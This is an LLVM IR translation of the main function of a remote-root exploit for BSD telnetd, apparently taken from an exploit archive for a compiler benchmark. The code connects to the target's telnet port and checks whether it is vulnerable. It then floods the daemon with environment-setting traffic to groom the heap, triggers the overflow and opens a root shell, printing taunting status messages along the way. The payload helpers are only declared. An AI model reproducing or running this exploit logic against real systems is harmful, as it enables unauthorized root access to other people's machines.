; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_409.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_409.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i64 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [73 x i8] c"7350854 - x86/bsd telnetd remote root\0Aby zip, lorian, smiler and scut.\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"n:cf\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@num = common dso_local global i32 0, align 4
@checkonly = common dso_local global i32 0, align 4
@force = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"failed to connect\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"aborting\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [35 x i8] c"failed to connect the second time\0A\00", align 1
@.str.5 = private unnamed_addr constant [81 x i8] c"\0A#############################################################################\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [149 x i8] c"ok baby, times are rough, we send %dmb traffic to the remote\0Atelnet daemon process, it will spill badly. but then, there is no\0Aother way, sorry...\0A\0A\00", align 1
@mode = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [54 x i8] c"## setting populators to populate heap address space\0A\00", align 1
@pop = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [43 x i8] c"## number of setenvs (dots / network): %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [44 x i8] c"## number of walks (percentage / cpu): %Lu\0A\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"##\0A\00", align 1
@.str.11 = private unnamed_addr constant [54 x i8] c"## the percentage is more realistic than the dots ;)\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"percent |\00", align 1
@COL = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.15 = private unnamed_addr constant [14 x i8] c"|      ETA |\0A\00", align 1
@walk = common dso_local global i32 0, align 4
@.str.16 = private unnamed_addr constant [11 x i8] c"\0D%3.2f%% |\00", align 1
@.str.17 = private unnamed_addr constant [12 x i8] c"\0D %2.2f%% |\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"\0D  %1.2f%% |\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.21 = private unnamed_addr constant [22 x i8] c"| %02lu:%02lu:%02lu |\00", align 1
@.str.22 = private unnamed_addr constant [13 x i8] c"| --:--:-- |\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.24 = private unnamed_addr constant [55 x i8] c"## sleeping for 10 seconds to let the process recover\0A\00", align 1
@.str.25 = private unnamed_addr constant [41 x i8] c"## ok, you should now have a root shell\0A\00", align 1
@.str.26 = private unnamed_addr constant [54 x i8] c"## as always, after hard times, there is a reward...\0A\00", align 1
@.str.27 = private unnamed_addr constant [12 x i8] c"\0A\0Acommand: \00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.timeval, align 8
  %15 = alloca %struct.timeval, align 8
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  %18 = alloca i32, align 4
  %19 = alloca float, align 4
  %20 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  %21 = load i32, i32* @stderr, align 4
  %22 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str, i64 0, i64 0))
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  store i8* %25, i8** %7, align 8
  %26 = load i32, i32* %4, align 4
  %27 = icmp slt i32 %26, 2
  br i1 %27, label %28, label %31

28:                                               ; preds = %2
  %29 = load i8*, i8** %7, align 8
  %30 = call i32 @usage(i8* %29)
  br label %31

31:                                               ; preds = %28, %2
  br label %32

32:                                               ; preds = %51, %31
  %33 = load i32, i32* %4, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = call signext i8 @getopt(i32 %33, i8** %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i8 %35, i8* %6, align 1
  %36 = sext i8 %35 to i32
  %37 = load i8, i8* @EOF, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp ne i32 %36, %38
  br i1 %39, label %40, label %52

40:                                               ; preds = %32
  %41 = load i8, i8* %6, align 1
  %42 = sext i8 %41 to i32
  switch i32 %42, label %48 [
    i32 110, label %43
    i32 99, label %46
    i32 102, label %47
  ]

43:                                               ; preds = %40
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @atoi(i32 %44)
  store i32 %45, i32* @num, align 4
  br label %51

46:                                               ; preds = %40
  store i32 1, i32* @checkonly, align 4
  br label %51

47:                                               ; preds = %40
  store i64 1, i64* @force, align 8
  br label %51

48:                                               ; preds = %40
  %49 = load i8*, i8** %7, align 8
  %50 = call i32 @usage(i8* %49)
  br label %51

51:                                               ; preds = %48, %47, %46, %43
  br label %32

52:                                               ; preds = %32
  %53 = load i8**, i8*** %5, align 8
  %54 = load i32, i32* %4, align 4
  %55 = sub nsw i32 %54, 1
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8*, i8** %53, i64 %56
  %58 = load i8*, i8** %57, align 8
  store i8* %58, i8** %8, align 8
  %59 = load i8*, i8** %8, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 0
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp eq i32 %62, 45
  br i1 %63, label %64, label %67

64:                                               ; preds = %52
  %65 = load i8*, i8** %7, align 8
  %66 = call i32 @usage(i8* %65)
  br label %67

67:                                               ; preds = %64, %52
  %68 = load i8*, i8** %8, align 8
  %69 = call i32 @net_connect(i32* null, i8* %68, i32 23, i32 20)
  store i32 %69, i32* %11, align 4
  %70 = load i32, i32* %11, align 4
  %71 = icmp sle i32 %70, 0
  br i1 %71, label %72, label %77

72:                                               ; preds = %67
  %73 = load i32, i32* @stderr, align 4
  %74 = call i32 @fprintf(i32 %73, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %75 = load i32, i32* @EXIT_FAILURE, align 4
  %76 = call i32 @exit(i32 %75) #3
  unreachable

77:                                               ; preds = %67
  %78 = call i32 (...) @random_init()
  %79 = load i32, i32* %11, align 4
  %80 = call i64 @xp_check(i32 %79)
  %81 = icmp eq i64 %80, 0
  br i1 %81, label %82, label %89

82:                                               ; preds = %77
  %83 = load i64, i64* @force, align 8
  %84 = icmp eq i64 %83, 0
  br i1 %84, label %85, label %89

85:                                               ; preds = %82
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %87 = load i32, i32* @EXIT_FAILURE, align 4
  %88 = call i32 @exit(i32 %87) #3
  unreachable

89:                                               ; preds = %82, %77
  %90 = load i32, i32* %11, align 4
  %91 = call i32 @close(i32 %90)
  %92 = load i32, i32* @checkonly, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %97

94:                                               ; preds = %89
  %95 = load i32, i32* @EXIT_SUCCESS, align 4
  %96 = call i32 @exit(i32 %95) #3
  unreachable

97:                                               ; preds = %89
  %98 = load i8*, i8** %8, align 8
  %99 = call i32 @net_connect(i32* null, i8* %98, i32 23, i32 20)
  store i32 %99, i32* %11, align 4
  %100 = load i32, i32* %11, align 4
  %101 = icmp sle i32 %100, 0
  br i1 %101, label %102, label %107

102:                                              ; preds = %97
  %103 = load i32, i32* @stderr, align 4
  %104 = call i32 @fprintf(i32 %103, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  %105 = load i32, i32* @EXIT_FAILURE, align 4
  %106 = call i32 @exit(i32 %105) #3
  unreachable

107:                                              ; preds = %97
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.5, i64 0, i64 0))
  %109 = load i32, i32* @mode, align 4
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([149 x i8], [149 x i8]* @.str.6, i64 0, i64 0), i32 %109)
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  %112 = load i32, i32* @pop, align 4
  %113 = sdiv i32 %112, 2
  %114 = sext i32 %113 to i64
  %115 = load i32, i32* @pop, align 4
  %116 = add nsw i32 %115, 1
  %117 = sext i32 %116 to i64
  %118 = mul i64 %114, %117
  store i64 %118, i64* %17, align 8
  store i64 0, i64* %16, align 8
  %119 = load i32, i32* @pop, align 4
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0), i32 %119)
  %121 = load i64, i64* %17, align 8
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.9, i64 0, i64 0), i64 %121)
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.11, i64 0, i64 0))
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %127 = load i32, i32* @pop, align 4
  %128 = load i32, i32* @COL, align 4
  %129 = sdiv i32 %127, %128
  store i32 %129, i32* %13, align 4
  %130 = load i32, i32* @pop, align 4
  %131 = load i32, i32* %13, align 4
  %132 = sdiv i32 %130, %131
  store i32 %132, i32* %9, align 4
  br label %133

133:                                              ; preds = %138, %107
  %134 = load i32, i32* %9, align 4
  %135 = icmp sge i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  br label %138

138:                                              ; preds = %136
  %139 = load i32, i32* %9, align 4
  %140 = add nsw i32 %139, -1
  store i32 %140, i32* %9, align 4
  br label %133

141:                                              ; preds = %133
  %142 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.15, i64 0, i64 0))
  %143 = call i32 @gettimeofday(%struct.timeval* %14, i32* null)
  store i32 0, i32* @walk, align 4
  br label %144

144:                                              ; preds = %245, %141
  %145 = load i32, i32* @walk, align 4
  %146 = load i32, i32* @pop, align 4
  %147 = icmp slt i32 %145, %146
  br i1 %147, label %148, label %248

148:                                              ; preds = %144
  %149 = load i32, i32* %11, align 4
  %150 = call i32 @xp_pop(i32 %149)
  %151 = load i32, i32* @walk, align 4
  %152 = sext i32 %151 to i64
  %153 = load i64, i64* %16, align 8
  %154 = add i64 %153, %152
  store i64 %154, i64* %16, align 8
  %155 = load i32, i32* @walk, align 4
  %156 = load i32, i32* %13, align 4
  %157 = srem i32 %155, %156
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %159, label %162

159:                                              ; preds = %148
  %160 = load i32, i32* %12, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %12, align 4
  br label %162

162:                                              ; preds = %159, %148
  %163 = load i32, i32* @walk, align 4
  %164 = srem i32 %163, 200
  %165 = icmp eq i32 %164, 0
  br i1 %165, label %166, label %244

166:                                              ; preds = %162
  %167 = load i64, i64* %16, align 8
  %168 = mul i64 %167, 100
  %169 = load i64, i64* %17, align 8
  %170 = udiv i64 %168, %169
  %171 = trunc i64 %170 to i32
  store i32 %171, i32* %18, align 4
  %172 = load i64, i64* %16, align 8
  %173 = mul i64 %172, 100
  %174 = uitofp i64 %173 to float
  store float %174, float* %19, align 4
  %175 = load i64, i64* %17, align 8
  %176 = uitofp i64 %175 to float
  %177 = load float, float* %19, align 4
  %178 = fdiv float %177, %176
  store float %178, float* %19, align 4
  %179 = call i32 @gettimeofday(%struct.timeval* %15, i32* null)
  %180 = getelementptr inbounds %struct.timeval, %struct.timeval* %15, i32 0, i32 0
  %181 = load i64, i64* %180, align 8
  %182 = getelementptr inbounds %struct.timeval, %struct.timeval* %14, i32 0, i32 0
  %183 = load i64, i64* %182, align 8
  %184 = sub i64 %181, %183
  store i64 %184, i64* %20, align 8
  %185 = load i32, i32* %18, align 4
  %186 = icmp eq i32 %185, 100
  br i1 %186, label %187, label %188

187:                                              ; preds = %166
  br label %194

188:                                              ; preds = %166
  %189 = load i32, i32* %18, align 4
  %190 = sdiv i32 %189, 10
  %191 = icmp ne i32 %190, 0
  %192 = zext i1 %191 to i64
  %193 = select i1 %191, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i64 0, i64 0)
  br label %194

194:                                              ; preds = %188, %187
  %195 = phi i8* [ getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), %187 ], [ %193, %188 ]
  %196 = load float, float* %19, align 4
  %197 = fpext float %196 to double
  %198 = call i32 (i8*, ...) @printf(i8* %195, double %197)
  store i32 0, i32* %10, align 4
  br label %199

199:                                              ; preds = %205, %194
  %200 = load i32, i32* %10, align 4
  %201 = load i32, i32* %12, align 4
  %202 = icmp slt i32 %200, %201
  br i1 %202, label %203, label %208

203:                                              ; preds = %199
  %204 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  br label %205

205:                                              ; preds = %203
  %206 = load i32, i32* %10, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %10, align 4
  br label %199

208:                                              ; preds = %199
  br label %209

209:                                              ; preds = %215, %208
  %210 = load i32, i32* %10, align 4
  %211 = load i32, i32* @COL, align 4
  %212 = icmp sle i32 %210, %211
  br i1 %212, label %213, label %218

213:                                              ; preds = %209
  %214 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i64 0, i64 0))
  br label %215

215:                                              ; preds = %213
  %216 = load i32, i32* %10, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %10, align 4
  br label %209

218:                                              ; preds = %209
  %219 = load i32, i32* %18, align 4
  %220 = icmp ne i32 %219, 0
  br i1 %220, label %221, label %239

221:                                              ; preds = %218
  %222 = load float, float* %19, align 4
  %223 = fsub float 1.000000e+02, %222
  %224 = load float, float* %19, align 4
  %225 = fdiv float %223, %224
  %226 = load i64, i64* %20, align 8
  %227 = uitofp i64 %226 to float
  %228 = fmul float %225, %227
  %229 = fptosi float %228 to i32
  %230 = sext i32 %229 to i64
  store i64 %230, i64* %20, align 8
  %231 = load i64, i64* %20, align 8
  %232 = udiv i64 %231, 3600
  %233 = load i64, i64* %20, align 8
  %234 = urem i64 %233, 3600
  %235 = udiv i64 %234, 60
  %236 = load i64, i64* %20, align 8
  %237 = urem i64 %236, 60
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i64 0, i64 0), i64 %232, i64 %235, i64 %237)
  br label %241

239:                                              ; preds = %218
  %240 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.22, i64 0, i64 0))
  br label %241

241:                                              ; preds = %239, %221
  %242 = load i32, i32* @stdout, align 4
  %243 = call i32 @fflush(i32 %242)
  br label %244

244:                                              ; preds = %241, %162
  br label %245

245:                                              ; preds = %244
  %246 = load i32, i32* @walk, align 4
  %247 = add nsw i32 %246, 1
  store i32 %247, i32* @walk, align 4
  br label %144

248:                                              ; preds = %144
  %249 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0))
  %250 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.24, i64 0, i64 0))
  %251 = call i32 @sleep(i32 10)
  %252 = load i32, i32* %11, align 4
  %253 = call i32 @xp(i32 %252)
  %254 = call i32 @sleep(i32 1)
  %255 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.25, i64 0, i64 0))
  %256 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.26, i64 0, i64 0))
  %257 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.27, i64 0, i64 0))
  %258 = load i32, i32* @stdout, align 4
  %259 = call i32 @fflush(i32 %258)
  %260 = load i32, i32* %11, align 4
  %261 = call i32 @shell(i32 %260)
  %262 = load i32, i32* @EXIT_SUCCESS, align 4
  %263 = call i32 @exit(i32 %262) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @net_connect(i32*, i8*, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @random_init(...) #1

declare dso_local i64 @xp_check(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @gettimeofday(%struct.timeval*, i32*) #1

declare dso_local i32 @xp_pop(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @xp(i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
